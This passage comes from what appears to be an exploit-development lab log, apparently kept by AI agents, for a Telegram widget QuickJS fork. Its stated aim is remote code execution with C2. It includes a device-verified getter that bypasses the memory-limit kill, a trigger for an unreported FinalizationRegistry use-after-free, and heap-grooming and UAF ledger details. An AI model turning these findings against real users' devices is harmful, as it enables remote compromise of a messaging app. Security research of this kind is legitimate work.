* A **single-shot groom probe** (`n1_probe_groom.html`, 1,640 raw / 819 zlib)
  is delivered for the device: it builds the 31-block class-128 page
  (23 filler + T + 5 filler + FK + freed V), the 32-page fill, the big filler
  and a marker sequence `G0 → G1 → G2 → G3 → G4`; the only possible write is
  `T.len` at level -45 (a valid field), so a miss/OOM is non-destructive. Host
  fork: 6 MiB `G2 PRE-EVAL` + InternalError; 8 MiB `G4 RESULT TLEN=95` (gate
  miss, delivery works). On the device, `G4 RESULT TLEN=134` would be the
  first proof that the same-slab gate fired; `TLEN=95`/`G2` is a miss and the
  next host tuning datum.
* **TD2 is derivable without a hook** once the same-slab page order and the
  large-`idx` leak are in place; a blind sweep is still forbidden.
* No device MTE claim: the gate/leak write is in the tag-0 arena; the probe's
  `#v` marker is the device datum to collect.

### 10.7 New artifacts

```
lab/qjs_n1/widget/device/n1_probe_heap.html    360 raw / 239 zlib
lab/qjs_n1/widget/device/n1_probe_stage.html  7,746 raw / 3,011 zlib
lab/qjs_n1/widget/device/n1_probe_groom.html  1,640 raw / 819 zlib
lab/qjs_n1/logs/n1_device_probe_host.txt      host fork 6/8 MiB probe log
/tmp/opencode/slabgroom.js                    same-slab layout experiment
/tmp/opencode/gen_slabstage.py                fork-native gate scaffold
lab/qjs_fork_audit/n1_fork/                   fork trace build (N1 + n1_slot_of)
```

---

## 11. Device matrix (2026-11-07 late): OOM is fatal; the N1 gate is structurally incompatible

This section supersedes §10.6/§10.7 as the status of the N1 carrier. It is
measured on the device and cross-checked against the canonical engine tests.

### 11.1 The matrix

One DB, twelve widget messages on the Sony (13.2.2 / 72929), same c2560s-style
body (`<div id="v">Ok</div>`, `<script id="stageA">`, `<script id="stageB">`,
`"use strict";`). Results were read from the chat screenshot and logcat; both
are kept in
`lab/qjs_fork_audit/zeroday_hunt_parser/device/logs/device_parser_rce/script_matrix/`.

| # | script A | script B | observed | conclusion |
|---|----------|----------|----------|------------|
| m1 | `textContent="M1 A"` | `textContent="M1 B"` | **M1 B** | sibling `<script>`s both run |
| m2 | `"x".repeat(3000000)`, then `M2 A3M` | `M2 B3M` | **M2 B3M** | a 3 MB live allocation is fine; the loop continues |
| m3 | `"x".repeat(6200000)` | `M3 B` | bubble blank/frozen, badge `Widget stopped` | the allocation fails; B never runs |
| m4 | `throw new Error("boom")` | `M4 B` | **M4 B** | a catchable throw does not kill the widget; the loop continues |

The m3 widget is stopped with:

```
widget tg-widget:0/<CHAT_ID>/<CHAT_ID>/-1156798021 stopped (1): Memory limit exceeded (8 MB)
widget tg-widget:0/<CHAT_ID>/<CHAT_ID>/-1156798021 stopped (2): Memory limit exceeded (8 MB)
```

(`80347` is the m3 message id.) The bubble is the static body `Ok` at the m1
screenshot and blank/frozen at the m3 screenshot: the last render is kept, the
engine does not continue to the next script.

### 11.2 The policy is the engine's, not the probe's

The canonical widget-sandbox tests (`lab/qjs_fork_audit/widget-sandbox/tests/attacks.spec.ts`)
say it explicitly:

* "QuickJS from the TelegramMessenger/quickjs fork (quickjs-ng 0.17, as on
  native): out-of-memory is uncatchable, so a widget that tries to catch it is
  stopped like one that does not; the last render stays."
* "one 256 MB allocation is refused outright and stops the widget without
  growing it."

So the stop is caused by the **refused allocation itself**, not by a post-eval
heap-usage check. There is no ordering trick, no local filler to unwind, and no
`try/catch` that can keep the engine alive after a refusal. The device log
matches the canonical test (`Memory limit exceeded (8 MB)`).

### 11.3 What this closes

N1's trigger is exactly a failed `js_realloc(scopes, 180)` at the memory limit.
Every adaptation designed in §10 — the fork-native slab-metadata gate, the
class-80 fill for a bare-null F2 error, the same-64 KiB slab grooming, the
hook-free TD2, the compact 4 KB stage and the v7 BigInt endgame — is downstream
of that refusal. If the refusal kills the widget, the corrupted `JSArrayBuffer`
lives in a dead engine: `runScripts` stops (`engine->dead`) and no sibling
script can use it. The N1 real-ABUF carrier is therefore **closed for the
Telegram widget engine**, on Android and on iOS, independently of MTE.

### 11.4 Wrapper conclusion corrected

The earlier "exact one-line wrapper" rule is **retracted**. The probes that
looked like wrapper failures were OOM kills: the first script did run, wrote
`P0`/`S1PRE`, then died at a `repeat(6200000)`; because the engine freezes the
last render when it stops, the marker never reached the screen. The c2560s
wrapper (`<div id="v">Ok</div>`, `<script id="stageA">"use strict";…`) remains
the known-good delivery format — and its stage A contains newlines, so
newlines, IIFEs and `document` calls are not the issue. The binding constraint
is the memory limit, not the HTML shape.

### 11.5 iOS result (safe probe delivered; app crashed on the fatal path)

Frida was recovered: the earlier failure was a stale PID plus a version
mismatch, not a wedged server. With the **17.17.0 host venv**, the **17.17.0
server on 127.0.0.1:27043**, and the **current** PID, `deliver_n1_6s.py`
attached and delivered normally.

* `n1_ios_s1safe.html` (with the final `throw`): bubble stayed `N1SAFE`,
  badge `Widget stopped`; the `#v` result never flushed. This matches the
  Android "last render frozen" behaviour at the cap.
* `n1_ios_s1safe_nothrow.html` (1,736 zlib; same probe, final `throw` replaced
  by `void 0`): the app **died** at 22:06:51 in thread `message-widget.0`,
  `EXC_BAD_ACCESS/SIGSEGV` at `0x10371036103510d4`, frames include
  `__cxa_throw` and `TelegramUIFramework`. Crash log:
  `lab/qjs_postsnapshot/ios_n1/evidence/Telegram-2026-11-07-220651.ips`.
* The probe's `fillDown` also drives the iOS engine to the cap; the fatal stop
  path crashed the app while throwing the `JSError`. No marker, no N1 claim,
  and no further N1 heap-calibrated probes should be sent to the 6s.
* The app was relaunched by the system (PID 16385 at 22:12) and is stable.

### 11.6 Consequence for the two-0day goal

* **v7** remains the MTE-on RCE (Pixel 9, Developer Options MTE, full C2,
  uid 10290).
* **Parser c2560s** remains the universal MTE-off RCE (Sony 72929 5/5,
  72889 1/1).
* A second MTE-on 0day must be **same-tag and must not need an allocation
  failure or a near-cap heap**. The N1 artifacts stay as evidence of the
  primitive and of the engine policy, not as a carrier. The hunt must be
  re-scoped to non-OOM same-tag bugs (the parser 0day is cross-tag by
  construction and cannot be made miss-safe under MTE).

---

## 12. Same-tag, non-OOM hunt (2026-11-07 late, host-only) — negative for a write primitive

Host-only. No device, no Frida, no bot, no network. Source under test:
the shipped fork `2dfeee3e` (`lab/qjs_fork_audit/zeroday_hunt_parser/src`,
also present with git history at `lab/fork_fuzz/src`), harnesses and logs in
`lab/qjs_fork_audit/sametag_hunt_20261107/`.

### 12.1 Verdict

**No new same-tag, non-OOM memory-corruption primitive was found.** The
campaign produced zero ASan/UBSan crashes and zero violations of the four new
lifetime invariants (the only abort is quickjs's own teardown
`list_empty(&rt->gc_obj_list)` assert on the symbol-FinalizationRegistry
script, §12.8 — a leak). Two *new same-tag lifetime issues* were found and
characterized; both are leak/DoS, not corruption, and neither can be a
widget carrier:

1. an abandoned **async-function frame leaks** (~1.37 KB per call); the
   measured shape is consistent with the GC freeing `JSAsyncFunctionData`
   through the `gc_free_cycles` default branch without running
   `async_func_free` (cause inferred from the GC switch, not yet
   instrumented); the same leak exists in upstream quickjs-ng `e22ce4d`;
2. symbol-targeted `FinalizationRegistry` entries keep the context refcount
   positive at teardown (`JS_FreeRuntime` assert in debug builds; release
   builds free the runtime with live objects). Also upstream-shared.

Because the widget engine kills the widget on the *first* refused allocation,
a leak is only usable as an OOM DoS — the carrier class that is already
closed. No probe is recommended (see §12.5).

### 12.2 Tooling and evidence base (new for this section)

| build | what it adds | result |
|---|---|---|
| `build/run_asan` | clang ASan+UBSan, `-D__SANITIZE_ADDRESS__` (arena off, every block its own malloc, freed blocks poisoned) | no error in any script |
| `build/run_inst` | gcc `-O1` arena ON (device model) + four new lifetime invariants (see below) | no invariant abort; one quickjs teardown assert on `t_symzombie` (§12.8) |
| `build/run_ubsan_arena` | UBSan, arena ON | no error |
| `build/run_drain` | `run6m` + `JS_ExecutePendingJob` drain (the widget's job model) | used for leak measurement |
| `fuzz_*` (6) | fork source rebuilt with libFuzzer + ASan/UBSan + `FORCE_GC_AT_MALLOC` (a GC on every object creation) | about 55,000 execs over the six harnesses (240 s each): **0 crashes**; only a benign UBSan null-offset at `quickjs.c:60509` (`&data[ta->offset]` with `data == NULL`, never dereferenced) |

New invariants (`scripts/instrument_invariants.py`, all `abort()` so they work
in release builds):

* `js_free_shape()`: refcount must be > 0 before the decrement (shape double
  free / underflow).
* `js_revive_shape()`: a refcount-0 shape must be hashed and must be a member
  of `rt->shape_zombie_list`.
* `js_free_shape0()`: refcount must be exactly 0.
* `js_arena_free()`: size-class and block index in range, and the block must
  not already be on the arena free list (slab-block double free, the
  precondition for any same-slab UAF).

Scripts: `t_shape.js`, `t_shapes2.js` (30k adversarial shape chains with
fresh prototypes, deletes, compaction, inline→external growth), `t_ab.js`
(20k ArrayBuffer/DataView/TypedArray cycles incl. RAB resize/transfer),
`t_varref.js`, `t_release_coro.js` (60k generator/closure/var_ref teardown
orders), `t_regexp.js`/`t_regexp2.js` (cache collisions/evictions/compile),
`t_fastpath.js` (object-literal/prototype/JSON fast paths), `t_symzombie.js`
(20k symbol-keyed zombie shapes with WeakMap/FR records), `t_cycles.js`,
`t_finrec.js`.

### 12.3 The named priority surfaces, one by one

#### 12.3.1 `js_free_shape` zombie shapes and inline property arrays — dead

Mechanics verified in source and by instrumentation:

* a zombie is only created by `js_free_shape()` at refcount 0 with
  `is_hashed && !in_free && gc_phase == NONE` (`quickjs.c:6098`); it is
  `list_del`'d from `gc_obj_list` and kept in the shape hash;
* `js_revive_shape()` (`quickjs.c:6118`) requires exactly that state; the
  zombie-list membership check added here never fired in 30k shape churns;
* `js_free_shape_zombies()` runs at the *start* of `JS_RunGC`, before
  `gc_decref`, so a zombie never survives into a GC that could collect its
  `proto`; the `JS_SHAPE_ZOMBIE_MAX` eviction frees the oldest via
  `js_free_shape0()` (hash unlink + atom/proto release) outside the GC;
* the inline property array (`p->prop == p+1` iff the object was allocated
  with `prop_size <= 16`, `quickjs.c:6155`) is kept consistent by all three
  call sites (`add_property` matching-shape branch, `resize_properties`,
  `compact_properties`): every call passes a `new_size` that is either
  <= the current inline capacity (no move, capacity is enough) or >
  it (external block allocated and `p->shape->prop_count` values copied).
  The one suspicious dependency is that `js_realloc_object_prop()` uses
  `p->shape->prop_size` as the inline capacity; this is correct today
  because `p->shape` is still the old shape at every call site and the old
  shape's `prop_size` equals the inline capacity. No path assigns a larger
  shape without resizing.

Trigger that would be needed: a second `js_free_shape` on a zombie
(refcount 0 -> -1) or a shape assignment that skips the prop resize. Neither
is reachable; the instrumented detector stayed silent.

#### 12.3.2 `JSVarRef` detach and reentrant coroutine teardown — reentrancy is real, but safe

The closest thing to a write found in this campaign. The path is:

```
closure C is freed
  -> free_var_ref(V)            (V open, is_coro, last ref)   quickjs.c:7210
     -> sf->var_refs[idx] = NULL (before the release)
     -> js_release_coro(G)      quickjs.c:7196
        -> G refcount 0 -> free_object(G)
           -> js_generator_finalizer -> free_generator_stack_rt
              -> async_func_free  quickjs.c:21950
                 -> close_var_refs(sf)   // re-enters on the *same* frame
```

This is reproducible (20k iterations; `t_release_coro.js`). It does not
corrupt because:

* `free_var_ref` clears `sf->var_refs[idx]` before releasing the coroutine,
  so the reentrant `close_var_refs` cannot close the same var_ref twice;
* every *other* open coroutine var_ref holds its own counted reference on
  `G` (`JS_REF_COUNT(sf->cur_gc_obj)++` in `get_var_ref`), so `G` can only
  reach refcount 0 on the *last* open var_ref release — at which point no
  other open var_ref remains in the frame;
* during the reentrant free `gc_phase` is DECREF/REMOVE_CYCLES, so the nested
  `JS_FreeValueRT(G)` in `js_release_coro` moves the header between lists but
  never calls `free_object(G)` a second time (verified: no ASan report, no
  refcount-0/negative abort, no arena double free over 60k iterations).

#### 12.3.3 `JSArrayBuffer.array_list` finalizer order — a header write, but inert

`js_array_buffer_finalizer` (`quickjs.c:60268`) can run before the typed
array/DataView finalizers (same GC cycle), clear each `ta->link` and free the
`JSArrayBuffer` struct. The later typed-array finalizer then calls
`JS_FreeValueRT(ta->buffer)` on the already-freed AB *object*. That is a real
use-after-free touch, but only of the allocator block header's `ref_count`
(`js_rc(p)->ref_count`); during `JS_GC_PHASE_REMOVE_CYCLES`
`js_free_value_rt()` is a no-op, so it cannot double-free. A cross-GC
dangling `ta->buffer` is impossible because the view holds a counted
reference to the AB object. 20k AB/DataView/TypedArray cycles (including
RAB resize, `transfer`, and cycles through expando properties): no ASan
report, no arena invariant trip.

#### 12.3.4 Arena slabs, slot reuse and class-128/192 interactions — no stale pointer path

`arena_slab_take`/`arena_slab_give_back`/`js_arena_free` (`quickjs.c:1851`,
`2059`) were reviewed against the same-slab model:

* the `used` bitmap has one bit per 4 KiB slot (one slot per page on 4 KiB
  kernels), `released` one bit per page; a page is only `MADV_DONTNEED`'d
  when no slot in it is used, so no live block is ever discarded; on Linux
  the pages are zero-filled on the next touch (the fork only relies on this
  on Linux/Apple);
* the full/non-full slab ordering (`list_add_tail` when full) makes the
  `if (!free_slots) break` scan valid, and the keep-one-empty-arena rule
  (`js_arena_free`) / `js_arena_trim` pair is balanced: the kept arena stays
  on `free_arena_list` with a valid `first_free_block`, so the next
  allocation reuses it; `js_arena_trim` only releases arenas it finds on
  that list;
* the block header is outside the user block, so a neighbour overflow
  *would* corrupt `block_idx`/`size_idx`/`ref_count`; that is the
  exploitation shape we looked for, but no path writes past an arena block.

The instrumented double-free detector (free-list walk on every small free)
stayed silent over every script; therefore there is no same-slab UAF seed
from a normal (non-OOM) path in this engine.

#### 12.3.5 `FinalizationRegistry.unregister` UAF (existing 0day) — still DoS-only

The lab's unreported FR bug (`js_finrec_unregister`, `quickjs.c:64239`) is
same-tag, deterministic and does not need OOM. Re-examined for a
write-what-where: the stale `list_del(&fre->link)` would need the freed
88-byte (`class 96`) entry to be reclaimed with attacker bytes before the
`el1 = el->next` read. The only allocations in that gap are
`JS_EnqueueJob` payloads from `reset_weak_ref` (`sizeof(JSJobEntry) +
2*sizeof(JSValue)` = 56-64 bytes, arena class 64), which cannot reuse a
class-96 block, and no JS runs in the gap. The stale node's links are also
zeroed by `list_del`, so the next iteration dereferences a NULL-derived
address. Remains a native crash/DoS.

### 12.4 Ranked shortlist (write-primitive view)

| rank | candidate | exact trigger | memory / tag domain | avoids OOM? | host repro | verdict |
|---:|---|---|---|---|---|---|
| 1 | arena block double free | a JS-reachable double free of an 8-512 B arena block | QuickJS slab, tag 0 | yes | detector negative (all scripts) | **dead** (no trigger) |
| 2 | zombie-shape refcount underflow | second `js_free_shape` on a refcount-0 shape | shape block, tag 0 | yes | `t_shapes2` + invariants: silent | **dead** (no trigger) |
| 3 | reentrant coroutine teardown | free the only ref to a suspended generator via its captured-closure var_ref | frame/var_ref, tag 0 | yes | `t_release_coro` 60k: safe by slot clearing + counted refs | **dead** |
| 4 | AB/TA finalizer order | AB + view unreachable in one GC | AB struct/object, tag 0 | yes | `t_ab` 20k: header-only touch, no free | **dead** |
| 5 | FR unregister UAF write | `reg.unregister(tok)` with a second entry on the dying target | FR entry class 96, tag 0 | yes | known repro; gap has no class-96 allocation | DoS only |
| 6 | async-frame leak | abandoned async fn with a captured local | frame/arg_buf, tag 0 | no (leaks to the cap) | 1.37 KB/iter fork **and** upstream | DoS only |

The only same-tag assets that survive are read-only or DoS: F1
(`lre_get_groupnames` forward read), R1/R2 (in-block 2-byte reads), the FR
crash, and the two leaks above.

### 12.5 Probe: none recommended

The task's probe rule (“marker must survive; a refused allocation freezes the
render”) rules out every candidate above:

* the FR probe is a native crash (destructive to the app) and must not be
  sent;
* a leak probe necessarily ends in `Memory limit exceeded` (the engine kills
  the widget), i.e. exactly the signal the probe must not use;
* no candidate has a same-slab write to observe.

For the record, the probe that would exercise the strongest candidate
(the FR unregister UAF) is this 8-line body (well under 4,096 zlib):

```html
<div id="v">OK</div><script>"use strict";
var reg = new FinalizationRegistry(function(){});
var T = {}, tok = {}, k = {};
reg.register(k, T, tok);   /* entry 1: holds T strongly */
reg.register(T, 2);        /* entry 2: target T */
T = null;
reg.unregister(tok);       /* frees entry 1 -> frees T -> frees entry 2 in the loop */
</script>
```

It is **rejected**: on the host it is an ASan heap-use-after-free and on the
device (release, arena) the zeroed `link` makes the next loop step dereference
a NULL-derived address — a native SIGSEGV in the widget thread, i.e.
destructive. A marker written before the trigger cannot survive a process
death, and the task forbids destructive device tests.

If a later hunt produces a same-slab write primitive, the delivery template
of §4 still applies unchanged (sibling `<script>`s, marker written *before*
the trigger, no large filler, no try/catch around an allocation).

### 12.6 Honest negative and next directions

No candidate passes the bar “same-tag, non-OOM, host-reproduced write or
length/pointer corruption”. The strongest remaining leads, in order:

1. **Arena-block lifetime via a non-memory bug**: any JS-level double free
   (e.g. a finalizer/list bug like FR but with an allocation in the gap)
   becomes a same-slab UAF with one class-matched reclaim. Fuzz the
   `js_finrec_*`/`reset_weak_ref` family with allocation-size tracing, and
   look for a class-96 allocation reachable without JS in the gap.
2. **The counted-coro-ref design** is the only place in this engine where a
   reference is deliberately not a GC edge. A single missed release turns
   the leak into a premature free; audit every `is_coro` transition for a
   path that releases without clearing `is_coro` (none found today).
3. **Long GC-stress fuzzing of the fork's own perf commits** (the 240 s × 6
   campaign reached only ~55k execs because `FORCE_GC_AT_MALLOC` is slow;
   an 8 h run with the shape/typed/async generators is the natural next
   step).
4. **`js_arena_realloc` GC-header transfer**: prove the "no realloc of a
   GC-linked object" invariant mechanically (an assert in `js_realloc_rt`
   that the block is not on `gc_obj_list`), so a future code path cannot
   silently break it.

### 12.7 Files

```
lab/qjs_fork_audit/sametag_hunt_20261107/run_all.sh           reproducer driver
lab/qjs_fork_audit/sametag_hunt_20261107/scripts/*.js        stress/trigger scripts
lab/qjs_fork_audit/sametag_hunt_20261107/scripts/instrument_invariants.py
lab/qjs_fork_audit/sametag_hunt_20261107/scripts/run6m_drain.c
lab/qjs_fork_audit/sametag_hunt_20261107/logs/{asan,inst,ubsan,async_leak}.log
notes/LEMMALOG_FACTS_sametag_negative_20261107.txt
```

No existing file was deleted; no device, Frida, n-day, bot or network was
used. The async-frame leak is a new, measured, upstream-shared DoS finding;
the FR unregister UAF remains DoS-only.

### 12.8 Two teardown observations (not corruption; recorded so they are not rediscovered as bugs)

* **Symbol-targeted `FinalizationRegistry` entries leak the context at
  teardown.** `reg.register(symbolTarget, held, token)` stores the target as a
  JSAtomStruct (not a GC object), so `reset_weak_ref` never runs during the
  runtime GC; the entries keep their `JS_DupContext` refs and
  `JS_FreeContext` returns early. `JS_FreeRuntime` then finds live GC objects:
  quickjs's own `assert(list_empty(&rt->gc_obj_list))` fails in assert builds
  for **both** the shipped fork and upstream `e22ce4d` (logs in
  `sametag_hunt_20261107/logs/inst.log`). Release builds proceed and free the
  runtime's atoms/shape hash/arena slabs with the leaked context still
  allocated. The engine dtor order is `JS_FreeContext(ctx)` →
  `JS_FreeRuntime(rt)` and nothing touches the context afterwards, so this is
  teardown-only; do not send a widget probe for it.
* **The async-function frame leak** (§12.1) is measured with the job-draining
  harness (the widget model); the root cause is not instrumented yet: `leak3.js` 1,478,408 B @1,000 iterations →
  5,582,408 B @4,000 (1.37 KB/iteration); upstream `e22ce4d`
  1,484,800 B → 5,612,800 B (same slope). Generators with captured-closure
  cycles are *not* leaking (`leak4.js` 150,720 B @1,000 → 148,952 B @4,000).

Both are leaks. Neither corrupts memory; both end in the engine's fatal
"Memory limit exceeded" if driven far enough.

### 12.9 Limits of this negative

* All new measurements are x86-64 host builds of the shipped source; the
  device engine is AArch64 and the arena slab code is the same source but not
  the same allocator state. The arena logic is architecture-independent
  except for the page size (`arena_slots_per_page()` handles 4/16/64 KiB
  pages); the host used 4 KiB pages.
* The six libFuzzer harnesses are generator-based (a few thousand edges
  each) and reached ~55k executions because `FORCE_GC_AT_MALLOC` makes every
  object creation a full GC. This is a smoke test, not a 507k-exec source
  corpus run; the round-6 507k negative already covers the source-level
  corpus on this snapshot.
* The GC-stress `run-test262 -c tests.conf` run with
  `-DFORCE_GC_AT_MALLOC` did not finish within 30 minutes (some tests become
  quadratic); it is not counted as evidence either way.
* No device, Frida, bot or network was used, per the task rules.

---

## 13. Sony subagent N1 probe rerun (2026-11-07 late, device)

Sony XQ-BT52, Android 13, Telegram beta 13.2.2 (72929), uid 10346. DB/root
harness only: fresh `cache4.db` per run with mid 80345 rebuilt by
`lab/qjs_n1/db/build_db.py`, app force-stopped/restarted, deep link opened,
screenshot + per-run cleared logcat. Full evidence in
`lab/qjs_n1/device_run_sony_subagent/REPORT.md`; runner `run_probe.sh`.

| payload | raw / zlib | bubble | logcat | marker |
|---|---|---|---|---|
| `n1_probe_stage.html` | 7,746 / 3,011 | `Ok` + `Widget stopped` | `stopped (1): Memory limit exceeded (8 MB)` | none |
| `n1_probe_host8.html` | 7,732 / 2,987 | `Ok` + `Widget stopped` | `stopped (1): Memory limit exceeded (8 MB)` | no `N1AB8 ABLEN=` |
| `n1_probe_host.html` | 7,679 / 2,966 | `Ok` + `Widget stopped` | `stopped (1): Memory limit exceeded (8 MB)` | no `N1AB ABLEN=` |
| `n1_probe_groom.html` | 1,640 / 819 | `Ok` + `Widget stopped` | `stopped (1): Memory limit exceeded (8 MB)` | no `G4 RESULT TLEN=` |

All four are stopped by a refused allocation; the app stays alive (new PID per
restart, no `FATAL`/`SIGSEGV`). A getter-instrumented stage probe
(`n1_probe_stage_getter.html`, 7,857 / 3,110) shows `S0 START`, not `S1PRE`:
the script aborts between those two markers, i.e. **before** `eval(src1)`. The
only allocation in that interval large enough to exceed the limit is the
`big1='x'.repeat(6074000)` filler (inference by size; the failing allocation is
not itself logged). The N1 gate is never reached on this device: the
6,074,000-byte filler plus the baseline large-block heap already exceeds the
limit.

## 14. OOM-kill bypass (getter) and N1 re-test (2026-11-07 late, device)

The orchestrator supplied an engine-side bypass, verified on the Sony:

```js
Object.defineProperty(InternalError.prototype,'name',{
  configurable:true,
  get(){ this.message='x'; return 'x'; }
});
```

`qjs_take_exception_description()` clears `uncatchable_pending` outside a JS
frame, then reads `name`/`message` through the getter; `handleError` sees
`x: x`, not `out of memory`, and takes the log branch instead of
`kill("Memory limit exceeded …")`.

### 14.1 Bypass proof (fresh widget state per run)

* `bypass.html` (423 raw / 247 zlib): `"x".repeat(7000000)` after installing
  the getter. Logcat: only
  `widget payload: zlib, 247 -> 423 bytes`; **no** `stopped`/`Memory limit`
  line. Bubble **`BYPASS B`**, no `Widget stopped` badge, app alive
  (PID 23957 -> 24231).
* Same body without the getter (`bypass_control.html`, 313 / 164): logcat has
  `widget … stopped (1): Memory limit exceeded (8 MB)`; bubble `Ok` +
  `Widget stopped`. So the 7,000,000 B allocation is genuinely refused and the
  getter run cannot be explained by 8 MiB headroom.

**Bypass verified**: the refused allocation no longer kills the widget and
`runScripts` continues to the next sibling `<script>`.

### 14.2 Full N1 + getter still does not carry

* `n1_sibling_getter.html` (17,207 / 6,702 = `n1_sibling_host.html` + getter):
  payload line only, no stop line, bubble `Ok` (no `#v` in this HTML), app
  alive (PID 24514 -> 24893).
* Marker variant `n1_sibling_getter_marker.html` (17,481 / 6,851; same payload
  + `<div id="v">` + a 4th script): bubble
  **`M ABLEN=? TRIG=-1 BL=72 HITS=0`**, no stop line, app alive
  (24893 -> 25173). The 4th script running proves the engine survived every
  OOM; `ABLEN=?` proves stage 1 aborted before `var AB`, and the trigger ran
  with `AB` undefined (`V` length 0, `HITS=0`, `BL=72` untouched).

The getter changes the engine's post-script handling, not the aborted script's
control flow. On the Sony the 6 MiB stage dies at the `big1` filler
(`S0 START`), so the scoped-realloc gate is never reached; even if it were, the
uncatchable OOM aborts stage 1 before its `AB` setup. The full N1 carrier
remains **not proven** on the device; the "N1 closed" statement of §11 is
corrected only in its mechanism (the kill is bypassable), not in its outcome
(N1 still does not run). No destructive step was executed; the endgame CMD was
not patched.

Artifacts: `lab/qjs_n1/device_run_sony_subagent/` (per-run `screenshot.png`,
`logcat_filtered.txt`, `logcat_full.txt`, `meta.txt`, payload + sha256),
`lab/qjs_n1/widget/n1_sibling_getter.html`,
`lab/qjs_n1/widget/n1_sibling_getter_marker.html`,
`lab/qjs_n1/widget/device/n1_probe_stage_getter.html`,
`notes/LEMMALOG_FACTS_sony_n1_subagent.txt`.

---

## 15. Memory-bug ledger campaign (2026-11-07/08, host-only) — pointer and delta

A follow-up host-only campaign re-scoped to the fork-specific code (`JS_ARENA_SLABS`,
the GC/refcount-in-block-header merge, and the 2026-10 perf commits) and to the
complete memory-bug ledger the user asked for.

**Primary objective: honest negative.** No new same-tag, non-OOM 0day with a
v7-like same-allocation primitive was found. The allocator, the header merge and
the perf-commit surfaces (typed-array inline store, string hash cache, inline
property array, `put_field` add, RegExp bytecode cache, JSON fast paths) held
under three instrumented builds and the targeted corpus; two previously open
invariants are now mechanically checked and clean:

* **R1** `js_realloc_rt` never moves a block linked in `gc_obj_list`
  (closes §12.6 item 4);
* **A1–A4** arena slab invariants: block class matches its arena, no page
  double-ownership across live arenas, `js_arena_free` always derives a live
  slab slot of the same class, free-list indices in range.

**Ledger delta (all in `notes/memory_bug_log_20261107.md`; artifacts under
`lab/membug_ledger_20261107/`):**

| id | bug | novelty | host repro |
|---|---|---|---|
| MB-01 | `js_map_finalizer` WeakMap record UAF (class-96 arena, tag 0) | **n-day #1835** (`ebd139b` missing in `2dfeee3e`) | ASan UAF `quickjs.c:54778`; release SIGSEGV `delete_map_weak_ref:54450` |
| MB-02 | `js_finrec_unregister` FinalizationRegistry entry UAF (class-96, tag 0) | **unreported** (registry finalizer has the two-pass fix, unregister does not) | ASan UAF `quickjs.c:64251`; release SIGSEGV |
| MB-03 | `js_array_find` double free on the interrupt path (element `JSString`) | **n-day #1826** (`f4dd164`/`e22ce4d` missing) | ASan UAF in `js_array_find:44832`; release hang in `JS_FreeAtomStruct` (free-list corruption) |
| MB-04 | `JS_ReadRegExp` missing BC object reference | **n-day** (`f4fe478` missing) | not widget-reachable (BC deserialization is host-bundle only) |
| MB-05 | `JS_RegExpDelete` stale bytecode (v7) | **n-day #1827** | already in the tree |

The shipped-fork delta `app-snapshot..origin/master` is exactly six commits:
four memory fixes (MB-01, MB-03, MB-04, MB-05) and two non-memory ones
(`b06baf9` Array.fromAsync conformance, `1a402cb` test). Three of the four
memory fixes are widget-reachable; all three are known n-days. **There is no
unfixed fork-only memory fix in that delta.**

MB-01 and MB-02 are the same tag-0 arena class (96) the v7 pattern uses; both
are DoS-only because no allocation of that class happens between the free and
the second visit, so the freed record cannot be reclaimed with attacker bytes.
MB-03 *is* reclaimed (by `JS_ThrowInterrupted`'s own allocations) but only on
the uncatchable 300 ms-quota path, so it is not a carrier either.

Next leads recorded in the ledger §5: the interrupt-gated ownership class, the
finalizer-order class, and a long `FORCE_GC_AT_MALLOC` run on the A1–A4/R1
build.

---

## 16. Memory-limit engineering follow-up (2026-11-08) — pointer and two corrections

`notes/widget_memory_limits_20261108.md` is the deliverable of the size/heap/limit
subtask. Two corrections to earlier sections:

1. **F2 (bare-null OOM) is dead on 2dfeee3e.** `js_throw_uncatchable()` lifts
   `malloc_limit` while it builds the `InternalError`, so the error object always
   allocates. The catchable bare-null belongs to upstream quickjs-ng (`e22ce4d` /
   `7a23d8e`); `gen_ab_only.py`'s F2 retry will never see `ERRNULL` on the device.
   Every OOM on the device is an `InternalError`; the `InternalError.prototype.name`
   getter is the only lever (§14).
2. **The N1 gate is reachable without the 6,074,000 filler** (`big1`): a class-48
   exact-charge fill discovers the limit at runtime, and a promise job compiled before
   the fill runs the `eval` after the OOM-aborted fill script. Host: gate at 6 MiB and
   8 MiB with the same 1,270-zlib payload. The fake-chain layout (FK before the scopes
   block, TD1/TD2) remains the open item; the host currently segfaults after the gate.

The one-HTML N1 + trigger + v7-universal-endgame at ≤4,096 zlib is not feasible with the
text-source AB stage A (estimated 5.5–6.9 KB); the runtime-built compact stage A
(estimated ≈3.4 KB) or the already-proven v7 loader (3,056 zlib) are the nearest fits.
No device result is claimed.

## 15. Parser c2560s MTE route 2 and the same-payload verdict (2026-11-08)

**Deliverable:** `notes/parser_mte_route2_samepayload_20261108.md`; artifacts
in `lab/qjs_fork_audit/mte_route2_20261108/`.

* MTE question: **yes, a route exists without replacing the bug.** Put the
  vulnerable function's `JSFunctionBytecode` in the QuickJS arena (class 352,
  tag 0) and the +1,310,828-byte OOB target in a sprayed class-512 arena
  `ArrayBuffer` data block; the target is exactly 20 × 64 KiB slabs above
  `b`, same tag-0 domain. Host: 15/15 primitive at 6/8 MiB, full chain 5/5
  isolated and 5/5 under a 3 MB preload, 162-byte proof. The c2560s endgame
  needs a small tag-preserving patch for `realm`/`rt` (`endG9s.js`,
  host-validated).
* Same-payload across Sony 72929 beta (MTE off, 6 MiB) and Pixel release
  13.2.0/72801 (MTE on, 8 MB), ≤ 4,096 zlib9: **not established.** Route 2
  removes the Scudo class map and the MTE cross-tag blocker, and the 72801
  lib is the same QuickJS-ng 0.17.0 generation as 72929; but the arena-slab
  geometry is host-only, the release's `JS_ARENA_SLABS`/fork snapshot is
  inferred, the CMD is the beta package path, and the symbol-safe payload is
  4,079 zlib9 (17 bytes of margin) with per-device N2/phase tuning that does
  not fit. **Parser deprioritized vs N1; long-shot note only.** The v7 n-day
  remains the proven same-payload/MTE-on C2 reference.
